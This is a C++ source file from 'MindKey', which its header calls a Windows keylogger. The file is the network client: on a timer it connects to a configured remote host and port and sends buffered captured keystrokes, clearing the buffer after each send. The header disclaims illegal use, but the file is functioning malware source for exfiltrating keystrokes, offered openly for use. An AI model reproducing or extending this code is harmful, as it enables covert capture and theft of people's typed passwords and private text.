/* MindKey, Keylogger for Windows. 
 * While this program can potentially be used for nefarious purposes, 
 * it was written for educational and recreational purposes only
 * and the author does not endorse illegal use.
 *
 * Copyright (C) 2013 - 2014 Blackhack <https://github.com/blackhack/MindKey/>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "common.hpp"
#include "MindClient.h"


void Client::StartSendOperations()
{
    //Delay between sends.
    std::this_thread::sleep_for(std::chrono::seconds(NEXT_WRITE_TIME));

    try
    {
        if (_connection.socket().is_open())
            _connection.socket().close();

        boost::asio::ip::tcp::resolver resolver(_connection.socket().get_io_service());
        boost::asio::ip::tcp::resolver::query query(_host, _port);
        boost::asio::ip::tcp::resolver::iterator endpointIterator = resolver.resolve(query);

        boost::asio::async_connect(_connection.socket(), endpointIterator,
            boost::bind(&Client::HandleConnect, this,
            boost::asio::placeholders::error));
    }
    catch (std::exception& e)
    {
        std::cerr << e.what() << std::endl;
    }
}

void Client::HandleConnect(const boost::system::error_code& e)
{
    if (!e)
    {
        _keysBufferLock.lock(); // Bloqueamos el buffer hasta que los datos sean enviados.
        std::vector<PacketStruct> _toSend; //Temp
        _toSend.push_back(_keyPacket);
        _connection.async_write(_toSend, boost::bind(&Client::HandleWrite, this, boost::asio::placeholders::error));
    }
    else
    {
        std::cerr << e.message() << std::endl;
        StartSendOperations();
    }
}

void Client::HandleWrite(const boost::system::error_code& e)
{
    if (!e)
        _keyPacket.Data.clear();

    _keysBufferLock.unlock(); // Unlock buffer

    StartSendOperations();
}

void Client::InsertData(std::string data)
{
    _keysBufferLock.lock();
    _keyPacket.Id = 1;
    _keyPacket.Data.push_back(data);
    _keysBufferLock.unlock();
}
